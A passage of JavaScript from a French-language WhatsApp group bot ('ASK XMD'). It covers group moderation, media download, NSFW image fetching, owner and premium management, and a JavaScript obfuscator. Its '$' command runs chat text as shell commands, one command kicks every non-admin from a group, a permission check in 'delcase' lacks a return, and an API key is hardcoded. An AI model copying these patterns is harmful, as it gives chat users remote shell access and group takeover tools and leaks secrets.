 ask.sendMessage(m.chat, { text: result }, { quoted: m });
 } catch (e) {
 ask.sendMessage(m.chat, { text: `Case *${text}* tidak ditemukan` }, { quoted: m });
 }
 }
 break;
 
case 'couple': {
 try {
 // Récupérer les données JSON depuis l'URL
 const response = await axios.get('https://raw.githubusercontent.com/iamriz7/kopel_/main/kopel.json');
 const couples = response.data;

 // Vérifier si nous avons suffisamment de couples
 if (couples.length < 3) {
 return ask.sendMessage(m.chat, { text: "Il n'y a pas assez de couples disponibles." }, { quoted: m });
 }

 // Sélectionner trois couples aléatoires sans répétition
 const randomIndices = [];
 while (randomIndices.length < 3) {
 const randomIndex = Math.floor(Math.random() * couples.length);
 if (!randomIndices.includes(randomIndex)) {
 randomIndices.push(randomIndex);
 }
 }

 // Envoyer les images des couples sélectionnés
 for (let i = 0; i < randomIndices.length; i++) {
 const randomCouple = couples[randomIndices[i]];

 await ask.sendMessage(m.chat, {
 image: { url: randomCouple.male },
 caption: `Couple Male ${i + 1}`
 }, { quoted: m });

 await ask.sendMessage(m.chat, {
 image: { url: randomCouple.female },
 caption: `Couple Female ${i + 1}`
 }, { quoted: m });
 }

 } catch (error) {
 console.error('Erreur lors de la récupération des données du couple:', error);
 ask.sendMessage(from, { text: 'Erreur lors de la récupération des données du couple.' }, { quoted: m });
 }
}
break;

 

case "open": {
if (!isGroup) return m.reply(mess.group)
if (!isBotAdmin) return m.reply('le bot est pas admin')
if (!isAdmin && !isCreator) return m.reply(mess.admin)
await ask.groupSettingUpdate(m.chat, 'not_announcement')
m.reply("*LES PARAMÈTRES DU GROUPE ON CHANGÉ ✅*\ntout le monde peux envoyer des messages dans le groupe")
}
break

case "close": {
if (!isGroup) return m.reply(mess.group)
if (!isBotAdmin) return m.reply('vous n\'êtes pas admin')
if (!isAdmin && !isCreator) return m.reply(mess.admin)
await ask.groupSettingUpdate(m.chat, 'announcement')
m.reply("*LES PARAMÈTRES DU GROUPE A ETE CHANGE AVEC SUCCÈS✅*\nseule les admin peuve envoyé des messages")
}
break;

case "setdesc": case "setdesk": {
if (!isGroup) return m.reply(mess.group)
if (!isBotAdmin) return m.reply("vous devez être admin")
if (!isAdmin && !isCreator) return m.reply(mess.admin)
if (!text) return m.reply('Ou est le texte ??')
await ask.groupUpdateDescription(m.chat, text)
m.reply(`*La description du groupe a été change ✅*`)
}
break;

case "jid": {
if (!isCreator && !isPremium) return
m.reply(`𝖠𝖲𝖪-𝖷𝖬𝖣\n𝖸𝖮𝖴𝖱 𝖩𝖨𝖣 😋 ${m.chat}`)
}
break;

 case 'setlinkgc':
 await ask.sendMessage(m.chat, { react: { text: "♻️",key: m.key,}})
 if (!isGroup) return m.reply(mess.only.group)
 if (!isAdmin && !isCreator) return reply(mess.owner)
 if (!isBotAdmin) return reply(mess.admin)
 await ask.groupRevokeInvite(m.chat)
 .then(res => {
 m.reply(`*le liens du group ete réinitialiser avec succès ✅*`)
 })
 break;


case "apk":
 case "apkdl":
 {
 await ask.sendMessage(m.chat, { react: { text: "👨🏽‍💻",key: m.key,}})
 if (!text) return m.reply("*𝖶𝖧𝖨𝖢𝖧 𝖠𝖯𝖪 𝖣𝖮 𝖸𝖮𝖴 𝖶𝖠𝖭𝖳 𝖳𝖮 𝖣𝖮𝖶𝖭𝖫𝖮𝖠𝖣 ?*");
 let kyuu = await fetchJson (`https://bk9.fun/search/apk?q=${text}`);
 let tylor = await fetchJson (`https://bk9.fun/download/apk?id=${kyuu.BK9[0].id}`);
 await ask.sendMessage(
 m.chat,
 {
 document: { url: tylor.BK9.dllink },
 fileName: tylor.BK9.name,
 mimetype: "application/vnd.android.package-archive",
 contextInfo: {
 externalAdReply: {
 body: `${tylor.BK9.name}`,
 thumbnailUrl: `${tylor.BK9.icon}`,
 sourceUrl: `${tylor.BK9.dllink}`,
 mediaType: 2,
 showAdAttribution: true,
 renderLargerThumbnail: false
 }
 }
 }, { quoted: m });
 }
 break;

 case "song":{
 await ask.sendMessage(m.chat, { react: { text: "🎼",key: m.key,}})
 if (!text) return m.reply(`𝖤𝖷𝖠𝖬𝖯𝖫𝖤:* ${prefix + command} 𝖳𝖨𝖠𝖪𝖮𝖫𝖠 𝖳.𝖨.𝖠`)
 
 await m.reply(`𝘱𝘳𝘰𝘤𝘦𝘴𝘴𝘪𝘯𝘨 𝘺𝘰𝘶𝘳 𝘳𝘦𝘲𝘶𝘦𝘴𝘵... `);
 let mbut = await fetchJson(`https://ochinpo-helper.hf.space/yt?query=${text}`)
 let ahh = mbut.result
 let crot = ahh.download.audio

 ask.sendMessage(m.chat, {
 audio: { url: crot },
 mimetype: "audio/mpeg", 
 ptt: true
 }, { quoted: m })
 }
 break;

case 'setnamegc':
 if (!m.isGroup) return m.reply(mess.group);
 if (!isAdmin && !isCreator) return m.reply(mess.admin);
 if (!isBotAdmin) return m.reply("Le bot doit être administrateur");
 if (!text) return m.reply(' Ou est le Texte ?');

 await ask.groupUpdateSubject(m.chat, text);
 m.reply(mess.done);
 break;

case 'delete':
case 'del':
case 'd': {
 if (!m.quoted) return m.reply('Répondre au message que vous souhaitez supprimer');
 await ask.sendMessage(m.chat, {
 delete: {
 remoteJid: m.chat,
 fromMe: m.isBotAdmin ? false : true,
 id: m.quoted.id,
 participant: m.quoted.sender
 }
 });
}
break;

case "hidetag":
case "h": {
 if (!isGroup) return m.reply(mess.group);
 if (!isCreator && !isAdmins) return m.reply(mess.owner);
 if (!m.quoted && !text) return m.reply(`*Envoyez la commande avec le texte: ${prefix + command} <Text>*`);

 var teks = m.quoted ? m.quoted.text : text;
 var member = await groupMetadata.participants.map(e => e.id);

 ask.sendMessage(m.chat, { text: teks, mentions: [...member] });
 }
break;

case 'kick': {
 if (!isGroup) return m.reply(mess.group);
 if (!isCreator && !isAdmin) return m.reply(mess.admin);
 if (!isBotAdmin) return m.reply("✖️ *Le bot doit être administrateur*");

 if (text || m.quoted) {
 const input = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text ? text.replace(/[^0-9]/g, "") + "@s.whatsapp.net" : false;
 var onWa = await ask.onWhatsApp(input.split("@")[0]);

 if (onWa.length < 1) return m.reply("Numéro non enregistré sur WhatsApp");

 const res = await ask.groupParticipantsUpdate(m.chat, [input], 'remove');
 await m.reply(`Succès : ${input.split("@")[0]} a été expulsé du groupe`);
 } else {
 return m.reply("Envoyez la commande avec le texte:\n.kick @tag/répondre");
 }
}
break;



case "delowner": {
 if (!isCreator) return m.reply(mess.owner);
 if (!m.quoted && !text) return m.reply("Exemple : 241XXX");

 const input = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
 const input2 = input.split("@")[0];

 if (input2 === global.owner || input == botNumber) {
 return m.reply("Impossible de supprimer le propriétaire principal !");
 }

 if (!kontributor.includes(input)) {
 return m.reply(`Le numéro ${input2} n'est pas propriétaire du bot !`);
 }

 let posi = kontributor.indexOf(input);
 await kontributor.splice(posi, 1);
 await fs.writeFileSync("./system/database/owner.json", JSON.stringify(kontributor, null, 2));
 m.reply("Propriétaire supprimé avec succès ✅");
}
break;

case "addowner":
case "addown": {
 if (!isCreator) return m.reply(mess.owner);
 if (!m.quoted && !text) return m.reply("Exemple : 241XXX");

 const input = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
 const input2 = input.split("@")[0];

 if (input2 === global.owner || kontributor.includes(input) || input === botNumber) {
 return m.reply(`Le numéro ${input2} est déjà propriétaire du bot !`);
 }

 kontributor.push(input);
 await fs.writeFileSync("./system/database/owner.json", JSON.stringify(kontributor, null, 2));
 m.reply("Propriétaire ajouté avec succès ✅");
}
break;

case "join": {
 if (!isCreator) return m.reply(mess.owner);
 if (!text) return m.reply("Exemple : lien du groupe");
 if (!text.includes("chat.whatsapp.com")) return m.reply("*❌Lien non valide*");

 let result = text.split('https://chat.whatsapp.com/')[1];
 let id = await ask.groupAcceptInvite(result);
 m.reply(`*Réussi à rejoindre le groupe ${id}*`);
}
break;

case "delprem": {
 if (!isCreator) return m.reply(mess.owner);
 if (args.length < 1) return m.reply(`Exemple : \ndelprem 241xxx`);
 if (m.mentionedJid.length !== 0) {
 for (let i = 0; i < m.mentionedJid.length; i++) {
 let mentionedPremiumIndex = premium.findIndex(premium => premium.id === m.mentionedJid[i]);
 if (mentionedPremiumIndex !== -1) {
 premium.splice(mentionedPremiumIndex, 1);
 }
 }
 fs.writeFileSync("./system/database/premium.json", JSON.stringify(orgkaya));
 m.reply("Succès de la suppression");
 } else {
 let targetNumber = args[0] + "@s.whatsapp.net";
 let targetPremiumIndex = premium.findIndex(premium => premium.id === targetNumber);
 if (targetPremiumIndex !== -1) {
 premium.splice(targetPremiumIndex, 1);
 fs.writeFileSync("./system/database/premium.json", JSON.stringify(premium));
 m.reply("Succès via numéro");
 await sleep(2000);
 ask.sendMessage(
 targetNumber,
 {
 text: `Votre utilisateur Premium a été supprimée.`
 },
 {
 quoted: m
 }
 );
 } else {
 m.reply("Entité anormale non trouvée");
 }
 }
}
break;

 case "addprem": {
 if (!isCreator) return m.reply(mess.owner);
 if (args.length < 2)
 return m.reply(`Exemple :\naddprem 241xxx`);
 if (m.mentionedJid.length !== 0) {
 for (let i = 0; i < m.mentionedJid.length; i++) {
 addPremiumUser(m.mentionedJid[0], args[1], premium);
 }
 m.reply("Succès Premium");
 } else {
 addPremiumUser(args[0] + "@s.whatsapp.net", args[1], premium);
 m.reply("Succès via numéro");
 await sleep(2000);
 ask.sendMessage(
 args[0] + "@s.whatsapp.net",
 {
 text: `Vous êtes maintenant un membre premium`
 },
 {
 quoted: m
 }
 );
 }
}
break;

case 'owner': {
 let owners = [];
 let premiumUsers = [];

 try {
 // Lecture des données des propriétaires
 const ownerData = fs.readFileSync('system/database/owner.json', 'utf8');
 owners = JSON.parse(ownerData);
 } catch (error) {
 console.error('Erreur lors de la lecture du fichier owner.json:', error);
 }

 try {
 // Lecture des données des utilisateurs premium
 const premiumData = fs.readFileSync('system/database/premium.json', 'utf8');
 premiumUsers = JSON.parse(premiumData);
 } catch (error) {
 console.error('Erreur lors de la lecture du fichier premium.json:', error);
 }

 // Création du message avec les informations
 const mText = `*ASK XMD OWNER BOT*\n> Nombre de propriétaires: ${owners.length}\n> Nombre d'utilisateurs premium: ${premiumUsers.length}`;

 try {
 // Envoi du message avec l'image
 await ask.sendMessage(m.chat, {
 image: { url: `welcome.png` },
 caption: mText,
 title: `© 𝐀𝐒𝐊 𝐓𝐄𝐂𝐇 𝐗𝐌𝐷`,
 body: `wa.me/24165183695`,
 sourceUrl: `https://whatsapp.com/channel/0029Vb62KL4KmCPWvI5EHD2S`, 
 });
 } catch (error) {
 console.error('Erreur lors de l\'envoi de l\'image:', error);
 m.reply('Une erreur est survenue');
 }
}
break;


case 'onli': { 

 m.reply (`━━━━━━━━━━━━━━━━━\n\(づ。◕‿‿◕｡)づ𝐖𝐄𝐋𝐂𝐎𝐌𝐄 ${m.pushName}\n\━━━━━━━━━━━━━━━━━\n\*ASK XMD ONLI 🟢* : ${runtime(process.uptime())} \n\━━━━━━━━━━━━━━━━━`); 
}
break;


case 'clc':
case "calculator":{
if (text.split("+")[0] && text.split("+")[1]) {
const nilai_one = Number(text.split("+")[0])
const nilai_two = Number(text.split("+")[1])
m.reply(`${nilai_one + nilai_two}`)
} else if (text.split("-")[0] && text.split("-")[1]) {
const nilai_one = Number(text.split("-")[0])
const nilai_two = Number(text.split("-")[1])
m.reply(`${nilai_one - nilai_two}`)
} else if (text.split("×")[0] && text.split("×")[1]) {
const nilai_one = Number(text.split("×")[0])
const nilai_two = Number(text.split("×")[1])
m.reply(`${nilai_one * nilai_two}`)
} else if (text.split("÷")[0] && text.split("÷")[1]) {
const nilai_one = Number(text.split("÷")[0])
const nilai_two = Number(text.split("÷")[1])
m.reply(`${nilai_one / nilai_two}`)
} else m.reply(`*Example* : ${prefix + command} 1 + 1`)
}
break;


case 'antipromote': {
 if (!m.isGroup) return m.reply('⚠️ Cette commande ne fonctionne que dans les groupes');
 if (!isAdmin && !isCreator) return m.reply('🔒 Réservé aux administrateurs');

 // Charger les paramètres
 const groupSettings = require('./system/database/groupSettings.json');
 const groupId = m.chat;

 // Initialiser si le groupe n'existe pas
 if (!groupSettings[groupId]) {
 groupSettings[groupId] = { antipromote: false };
 }

 // Gérer on/off
 const action = args[0]?.toLowerCase();
 if (action === 'on' || action === 'off') {
 groupSettings[groupId].antipromote = (action === 'on');
 
 // Sauvegarder
 fs.writeFileSync('./system/database/groupSettings.json', JSON.stringify(groupSettings, null, 2));
 return m.reply(`🛡️ Antipromote ${action === 'on' ? 'activé' : 'désactivé'}`);
 } else {
 return m.reply(`État actuel : ${groupSettings[groupId]?.antipromote ? 'ON' : 'OFF'}\n\nUsage: ${prefix}antipromote [on|off]`);
 }
}
break;


case 'closetime': {
 if (!isGroup) return m.reply('reserve au groupe');
 if (!isAdmin) return m.reply('❌ Réservé aux admins du groupe');
 if (!text) return m.reply('❌ Usage: .closetime 30s (ou 5m, 1h, 2d)');

 // Analyse de la durée
 const timeMatch = text.match(/^(\d+)([smhd])$/i);
 if (!timeMatch) return m.reply('Format invalide. Exemples:\n.closetime 30s\n.closetime 1h\n.closetime 2d');

 const [, amount, unit] = timeMatch;
 let milliseconds;
 
 // Conversion en millisecondes
 switch(unit.toLowerCase()) {
 
 case 'm': milliseconds = amount * 60000; break;
 case 'h': milliseconds = amount * 3600000; break;
 case 'd': milliseconds = amount * 86400000; break;
 default: return m.reply('Unité invalide (s,m,h,d)');
 }

 if (milliseconds > 86400000) return m.reply('❌ Durée max: 24h');

 try {
 // Fermer le groupe
 await ask.groupSettingUpdate(m.chat, 'announcement');
 m.reply(`🔒 Groupe fermé pour ${text}\n\nLes participants ne pourront pas envoyer de messages`);

 // Programmer la réouverture
 setTimeout(async () => {
 try {
 await ask.groupSettingUpdate(m.chat, 'not_announcement');
 ask.sendMessage(m.chat, { text: '🔓 Groupe rouvert automatiquement !' });
 } catch (e) {
 console.error('Erreur réouverture:', e);
 }
 }, milliseconds);

 // Enregistrer dans la DB (optionnel)
 if (global.groupSettings) {
 global.groupSettings[m.chat] = {
 closedUntil: Date.now() + milliseconds,
 closedBy: m.sender
 };
 }

 } catch (error) {
 console.error('Erreur fermeture:', error);
 m.reply('❌ Impossible de modifier les paramètres du groupe');
 }
}
 break;



 
case 'hantai': {
 if (!isCreator) {
 return m.reply('Réservé aux utilisateurs Premium');
 }
 const messages = [];
 const imageCount = 5; // Nombre d'images à envoyer

 for (let i = 0; i < imageCount; i++) {
 try {
 const waifudd = await axios.get('https://api.waifu.pics/nsfw/hentai');
 const imageUrl = waifudd.data.url;

 messages.push(
 ask.sendMessage(m.chat, {
 image: { url: imageUrl },
 caption: `*ASK XMD HWAIFU*`
 }, { quoted: m })
 );
 } catch (err) {
 console.error(`Erreur lors de la récupération de l'image ${i + 1}:`, err);
 messages.push('Erreur lors de la récupération de l\'image.');
 }
 }

 await Promise.all(messages); // Attendre que tous les messages soient envoyés
}
break


case "kickall2": {
 if (!isGroup) return m.reply("Cette commande ne peut être utilisée que dans un groupe.");
 if (!isAdmin && !isCreator) return m.reply("Seuls les administrateurs peuvent exécuter cette commande.");
 if (!isBotAdmin) return m.reply("Je dois être administrateur pour effectuer cette action.");

 const launchMessage = `
🚨 *Lancement de l'expulsion immédiate*

Par ordre de *${m.pushname}*, tous les membres non administrateurs vont être retirés du groupe.`;

 await ask.sendMessage(m.chat, { text: launchMessage });

 const freshGroupMetadata = await ask.groupMetadata(m.chat);
 const nonAdmins = freshGroupMetadata.participants
 .filter(p => p.admin === null)
 .map(p => p.id);

 if (nonAdmins.length === 0) {
 return m.reply("✅ Aucun membre non administrateur à expulser dans ce groupe.");
 }

 try {
 await ask.groupParticipantsUpdate(m.chat, nonAdmins, "remove");

 const finalMessage = `
👑 *ASK XMD !*

L'opération est terminée. Le groupe est désormais sous contrôle.`;

 await ask.sendMessage(m.chat, { text: finalMessage });

 } catch (error) {
 console.error('Erreur durant la purge de masse:', error);
 await m.reply("❌ Une erreur est survenue lors de l'expulsion.");
 }
}
break;


case 'meteo': {
 if (!args[0]) return m.reply('⚠️ Veuillez fournir le nom d\'une ville.\nExemple : .meteo Lomé');

 const city = args.join(" ");
 const apiKey = '8044b9a239193d667183ab85fea38ca9'; // À remplacer si nécessaire
 const url = `https://api.openweathermap.org/data/2.5/weather?q=${city}&appid=${apiKey}&units=metric&lang=fr`;

 try {
 const res = await fetch(url);
 const data = await res.json();

 if (data.cod !== 200) {
 return m.reply(`❌ Ville introuvable : *${city}*`);
 }

 const { description, icon } = data.weather[0];
 const { temp, humidity, pressure } = data.main;
 const { speed } = data.wind;
 const iconUrl = `https://openweathermap.org/img/wn/${icon}@2x.png`;

 await ask.sendMessage(m.chat, {
 image: { url: iconUrl },
 caption: `*🌦️ Météo à ${data.name}*\n\n` +
 `📌 *Description :* ${description}\n` +
 `🌡️ *Température :* ${temp}°C\n` +
 `💧 *Humidité :* ${humidity}%\n` +
 `🔽 *Pression :* ${pressure} hPa\n` +
 `💨 *Vent :* ${speed} m/s\n\n` +
 `🗓️ Mise à jour actuelle.`,
 }, { quoted: m });

 } catch (err) {
 console.error("Erreur météo:", err);
 m.reply("❌ Une erreur est survenue lors de la récupération des données météo.");
 }
}
 break;


case 'chatbot':
case 'ai': {
 if (!text) return m.reply(`🤖 Veuillez poser votre question\nExemple: ${prefix}ia Comment ça va ?`);
 
 try {
 // Afficher un message "typing" pendant la requête
 await ask.sendPresenceUpdate('composing', m.chat);
 
 // Appeler l'API du chatbot
 const apiUrl = `https://apis.davidcyriltech.my.id/ai/chatbot?query=${encodeURIComponent(text)}`;
 const response = await fetch(apiUrl);
 
 if (!response.ok) throw new Error(`Erreur API: ${response.status}`);
 
 const data = await response.json();
 
 // Vérifier et formater la réponse
 let replyText = data.result || data.response || "Je n'ai pas pu obtenir de réponse";
 
 // Envoyer la réponse avec un formatage amélioré
 await m.reply(`🤖 ASK AI Répond:\n\n${replyText}\n\n_🔍 Question: ${text}_`);
 
 } catch (error) {
 console.error('Erreur chatbot:', error);
 m.reply(`⚠️ Désolé, une erreur s'est produite\n${error.message}`);
 }
}
break


case 'alltime': {
 // Calcul du temps de fonctionnement
 const uptime = process.uptime();
 const days = Math.floor(uptime / 86400);
 const hours = Math.floor((uptime % 86400) / 3600);
 const minutes = Math.floor((uptime % 3600) / 60);
 const seconds = Math.floor(uptime % 60);

 // Formatage du temps (problème réglé ici)
 const formatTime = (value, unit) => value > 0 ? `${value} ${unit}${value !== 1 ? 's' : ''}` : '';
 const uptimeString = [
 formatTime(days, 'jour'),
 formatTime(hours, 'heure'),
 formatTime(minutes, 'minute'),
 formatTime(seconds, 'seconde')
 ].filter(Boolean).join(', ');

 // Statistiques avancées
 const stats = {
 commandsExecuted: global.commandStats?.total || 0,
 activeUsers: Object.keys(global.userActivity || {}).length,
 groupsServed: global.groupStats?.size || 0,
 lastRestart: new Date(Date.now() - uptime * 1000).toLocaleString(),
 popularCommand: global.commandStats?.mostUsed || 'N/A'
 };

 // Message (identique à votre version)
 const message = `
🌟 *STATISTIQUES COMPLÈTES* 🌟

⏳ *Temps de fonctionnement* : 
${uptimeString}

📊 *Activité du bot* :
🔹 Commandes exécutées : ${stats.commandsExecuted}
🔹 Utilisateurs actifs : ${stats.activeUsers}
🔹 Groupes servis : ${stats.groupsServed}
🔹 Commande populaire : ${stats.popularCommand}

🖥️ *Système* :
📌 Dernier redémarrage : ${stats.lastRestart}
💾 Mémoire utilisée : ${(process.memoryUsage().rss / 1024 / 1024).toFixed(2)} MB
⚡ CPU : ${(process.cpuUsage().user / 1000000).toFixed(2)}s

🔍 *Version* : ${require('./package.json').version || 'Inconnue'}
 `;

 await m.reply(message);
}
break;


case 'antidemote': {
 if (!m.isGroup) return m.reply('> uniquem pour les groupes');
 if (!isAdmin && ! isCreator) return m.reply('> uniquement pour les admin');

 // Charger les paramètres
 const groupSettings = require('./system/database/groupSettings.json');
 const groupId = m.chat;

 // Initialisation
 if (!groupSettings[groupId]) {
 groupSettings[groupId] = { antidemote: false };
 }

 // Gestion ON/OFF
 const action = args[0]?.toLowerCase();
 if (action === 'on' || action === 'off') {
 groupSettings[groupId].antidemote = (action === 'on');
 
 // Sauvegarde
 fs.writeFileSync('./system/database/groupSettings.json', JSON.stringify(groupSettings, null, 2));
 return m.reply(`🛡️ Anti-demote ${action === 'on' ? 'activé' : 'désactivé'}`);
 } else {
 // Affichage état
 return m.reply(`État Anti-demote : ${groupSettings[groupId]?.antidemote ? '🟢 ON' : '🔴 OFF'}\n\nUsage: ${prefix}antidemote [on|off]`);
 }
}
break;


case 'enc':
case 'obfuscate': {
 if (!text) return m.reply(`🔧 Usage: ${prefix}obfusque <code_javascript>\nEx: ${prefix}obfusque function test() { console.log("hello"); }`);

 try {
 await m.reply('⚙️ Début de l\'obfuscation professionnelle...');

 const obfuscationOptions = {
 compact: true,
 controlFlowFlattening: true,
 deadCodeInjection: true,
 debugProtection: false, // Désactivé en mode normal
 disableConsoleOutput: true,
 identifierNamesGenerator: 'hexadecimal',
 rotateStringArray: true,
 selfDefending: true,
 stringArray: true,
 stringArrayEncoding: ['base64'],
 target: 'node',
 unicodeEscapeSequence: true
 };

 // Version premium avec options avancées
 if (isPremium) {
 obfuscationOptions.debugProtection = true;
 obfuscationOptions.domainLock = ['votredomaine.com'];
 obfuscationOptions.reservedNames = ['^_global_$'];
 }

 const result = JavaScriptObfuscator.obfuscate(text, obfuscationOptions);
 const obfuscatedCode = result.getObfuscatedCode();

 // Gestion des longs codes
 if (obfuscatedCode.length > 1500) {
 const filename = `obfuscated_${Date.now()}.js`;
 await ask.sendMessage(m.chat, {
 document: Buffer.from(obfuscatedCode),
 fileName: filename,
 mimetype: 'application/javascript',
 caption: `🔐 Code obfusqué (${obfuscatedCode.length} caractères)`
 });
 } else {
 await m.reply(`✅ Code obfusqué :\n\n\`\`\`javascript\n${obfuscatedCode}\n\`\`\``);
 }

 } catch (error) {
 console.error('Erreur obfuscation:', error);
 await m.reply('❌ Échec de l\'obfuscation : ' + error.message);
 }
}
break;


case "restart":
case "reboot": {
 if (!isAsk) return m.reply('> seule Dev ask ou un utilisateur premium peux utilise cette commande');

 await m.reply("🔄 Redémarrage du bot ASK XMD...");
 console.log(chalk.yellow(`[RESTART] Initiié par ${m.pushName} (${m.sender.split('@')[0]})`));

 try {
 // 1. Sauvegarde des données critiques
 fs.writeFileSync('./temp/restart_state.json', JSON.stringify({
 timestamp: moment().format('YYYY-MM-DD HH:mm:ss'),
 user: m.pushName,
 jid: m.sender,
 version: "1.0.0"
 }));

 // 2. Fermeture propre
 await ask.end();
 await new Promise(resolve => setTimeout(resolve, 2000));

 // 3. Redémarrage via package.json
 const { exec } = require('child_process');
 exec('npm run start', {
 cwd: process.cwd(),
 detached: true
 }, (error) => {
 if (error) {
 console.error(chalk.red('Erreur restart:'), error);
 return ask.sendMessage(m.sender, { 
 text: '❌ Échec du redémarrage\n' + 
 'Erreur: ' + error.message 
 });
 }
 });

 // 4. Kill propre du processus actuel
 process.exit(0);

 } catch (e) {
 console.error(chalk.red('Erreur restart:'), e);
 await m.reply(`⚠️ Erreur critique:\n${e.message}`);
 }
}
break;


case "$": {
 if (!isAsk) {
 return m.reply('> seule dev ask ou les premiu vip peuve ut cette commande ');
 }
 
 if (!text || args[0]?.toLowerCase() === 'help') {
 const commandList = `
🛠️ *LISTE DES COMMANDES SHELL DISPONIBLES* [ASK XMD]

📂 *Fichiers*
- ls : Lister les fichiers (ajouter -la pour les détails)
- cd : Changer de dossier
- mkdir : Créer un dossier
- rm : Supprimer un fichier
- cp/mv : Copier/déplacer des fichiers

📊 *Monitoring*
- top : Charges CPU/mémoire
- df -h : Espace disque
- free -m : Mémoire disponible
- uptime : Temps de fonctionnement

🌐 *Réseau*
- ping : Tester une connexion
- netstat : Ports ouverts
- curl : Requêtes HTTP
- wget : Téléchargement

💻 *Processus*
- pm2 list : Lister les processus Node
- ps aux : Tous les processus système

📦 *Gestion de paquets*
- npm install : Installer un package
- apt-get : Gestion paquets (Linux)

⚙️ *Utilitaires*
- git : Commandes Git
- nano : Éditeur de texte
- grep : Recherche dans fichiers

⚠️ *Commandes sensibles (owner only)*
- reboot : Redémarrer le serveur
- chmod : Modifier permissions

📌 *Exemple ASK XMD:* 
${prefix}$ ls -la
${prefix}$ pm2 list
${prefix}$ git status
`;
 return m.reply(commandList);
 }

 const fullCommand = text.split(' ').slice(1).join(' ').trim();
 if (!fullCommand) {
 return m.reply("❌ Tu dois entrer une commande shell après `$`.");
 }

 // Barre de progression style ASK XMD
 const loadingBar = (step, total) => {
 const filled = "▰".repeat(step);
 const empty = "▱".repeat(total - step);
 const percent = Math.floor((step / total) * 100);
 return `[${filled}${empty}] ${percent}%`;
 };

 const parts = fullCommand.split(" ");
 const cmd = parts[0];
 const cmdArgs = parts.slice(1);
 const startTime = Date.now();
 let output = "";
 let editing = false;
 let step = 0;
 const totalSteps = 10;

 // Message initial avec style ASK XMD
 const sentMsg = await m.reply(
 `💻 *[ASK XMD - SHELL EXEC]*\n` +
 `🔧 *Commande:*\n\`\`\`${fullCommand}\`\`\`\n` +
 `🔄 *Initialisation...* ${loadingBar(0, totalSteps)}`
 );

 const { spawn } = require("child_process");
 const child = spawn(cmd, cmdArgs, { shell: true });

 // Mise à jour live avec style ASK
 const updateInterval = setInterval(async () => {
 if (editing) return;
 editing = true;
 step = (step + 1) % (totalSteps + 1);
 const durationSec = Math.floor((Date.now() - startTime) / 1000);
 const preview = output.slice(-3000) || "⌛ En attente de sortie...";

 const newText = `💻 *[ASK XMD - SHELL EXEC]*\n` +
 `🔧 *Commande:*\n\`\`\`${fullCommand}\`\`\`\n` +
 `⏱️ *Durée:* ${durationSec}s | ${loadingBar(step, totalSteps)}\n\n` +
 `📤 *Sortie en direct:*\n\`\`\`${preview}\`\`\``;

 try {
 await ask.sendMessage(m.chat, { 
 edit: sentMsg.key, 
 text: newText 
 });
 } catch (e) {
 console.log("✖️ Erreur MAJ live:", e.message);
 }
 editing = false;
 }, 1500);

 child.stdout.on("data", (data) => output += data.toString());
 child.stderr.on("data", (data) => output += data.toString());

 child.on("close", async () => {
 clearInterval(updateInterval);
 const durationSec = Math.floor((Date.now() - startTime) / 1000);
 const finalOutput = output.trim() || "✅ Commande exécutée sans sortie.";

 await ask.sendMessage(m.chat, {
 edit: sentMsg.key,
 text: `✅ *[ASK XMD - EXEC TERMINÉE]*\n` +
 `🔧 *Commande:* ${fullCommand}\n` +
 `⏱️ *Durée totale:* ${durationSec}s\n\n` +
 `📤 *Résultat final:*\n\`\`\`${finalOutput.slice(-3500)}\`\`\`\n` +
 `\n\n> ⚡ *BY JEAN PARKER 🐼*`
 });
 });
}
break;


case 'hneko': {
 if (!isCreator) {
 return m.reply('> uniquement pour les owner');
 }
 const messages = [];
 const imageCount = 5; // Nombre d'images à envoyer

 for (let i = 0; i < imageCount; i++) {
 try {
 const waifudd = await axios.get('https://waifu.pics/api/nsfw/neko');
 const imageUrl = waifudd.data.url;

 messages.push(
 ask.sendMessage(m.chat, {
 image: { url: imageUrl },
 caption: `ASK XMD 🥺🥺`
 }, { quoted: m })
 );
 } catch (err) {
 console.error(`Erreur lors de la récupération de l'image ${i + 1}:`, err);
 messages.push('Erreur lors de la récupération de l\'image.');
 }
 }

 await Promise.all(messages); // Attendre que tous les messages soient envoyés
}
break;


case 'autoreact': {
 if (!isCreator) return m.reply('> uniquement pour les owner');
 
 // Charger la configuration
 const configFile = './system/database/autoreact.json';
 
 try {
 config = JSON.parse(fs.readFileSync(configFile));
 } catch (e) {
 }

 // Gérer ON/OFF
 const action = args[0]?.toLowerCase();
 if (action === 'on' || action === 'off') {
 config.status = (action === 'on');
 fs.writeFileSync(configFile, JSON.stringify(config, null, 2));
 return m.reply(`🔄 Mode autoreact ${config.status ? 'activé' : 'désactivé'}`);
 }

 // Afficher l'état actuel
 const statusMsg = `⚙️ Autoreact: ${config.status ? '🟢 ON' : '🔴 OFF'}\n` +
 
 `Usage: ${prefix}autoreact [on|off]`;
 await m.reply(statusMsg);
}
break;

    


            case 'delcase': {
                await ask.sendMessage(m.chat, { react: { text: "🗑️", key: m.key } });           
                if (!isCreator) m.reply(mess.owner);    
                if (!text) return m.reply('Entrez le nom du cas que vous souhaitez supprimer');
                const fs = require('fs');
                const nameFile = 'handler.js';
                fs.readFile(nameFile, 'utf8', (err, data) => {
                    if (err) {
                        console.error('Une erreur est survenue lors de la lecture du fichier :', err);
                        return m.reply('Échec de la lecture du fichier');
                    }
                    const casePattern = new RegExp(`case ['"]${text}['"]:[\\s\\S]*?break;`, 'g');
                    if (!casePattern.test(data)) {
                        return m.reply(`Le cas '${text}' n'a pas été trouvé`);
                    }
                    const newContent = data.replace(casePattern, '');
                    fs.writeFile(nameFile, newContent, 'utf8', (err) => {
                        if (err) {
                            console.error('Une erreur est survenue lors de l\'écriture du fichier :', err);
                            return m.reply('Échec de la suppression du cas');
                        }
                        m.reply(`Le cas '${text}' a été supprimé avec succès`);
                    });
                });
             }
                break;

            case 'addcase': {
                await ask.sendMessage(m.chat, { react: { text: "➕", key: m.key } });                
                if (!isCreator) return m.reply(mess.owner);
                if (!text) return m.reply('Où est le case ?');
                const fs = require('fs');
                const nameFile = 'handler.js';
                const caseAsk = `${text}`;
                fs.readFile(nameFile, 'utf8', (err, data) => {
                    if (err) {
                        console.error('Une erreur est survenue lors de la lecture du fichier :', err);
                        return m.reply('Échec de la lecture du fichier');
                    }
                    const poseAsk = data.indexOf("switch (command) {");
                    if (poseAsk !== -1) {
                        const insert = poseAsk + "switch (command) {".length;
